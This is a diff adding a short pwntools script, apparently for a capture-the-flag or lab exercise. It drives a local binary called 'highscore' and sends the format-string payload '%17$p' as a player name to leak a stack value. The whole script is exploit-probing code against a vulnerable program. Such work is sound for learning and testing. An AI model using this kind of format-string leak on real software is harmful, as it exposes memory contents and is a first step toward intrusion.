@@ -1,0 +1,20 @@
+from pwn import *
+import sys
+
+print("Starting process...")
+sys.stdout.flush()
+p = process('./highscore')
+print("Sending 1...")
+sys.stdout.flush()
+p.recvuntil(b'>> ')
+p.sendline(b'1')
+print("Sending payload...")
+sys.stdout.flush()
+p.recvuntil(b'Enter new name: ')
+p.sendline(b'%17$p')
+print("Reading response...")
+sys.stdout.flush()
+p.recvuntil(b'Player: ')
+print(f"Leak: {p.recvline().strip()}")
+sys.stdout.flush()
+p.close()
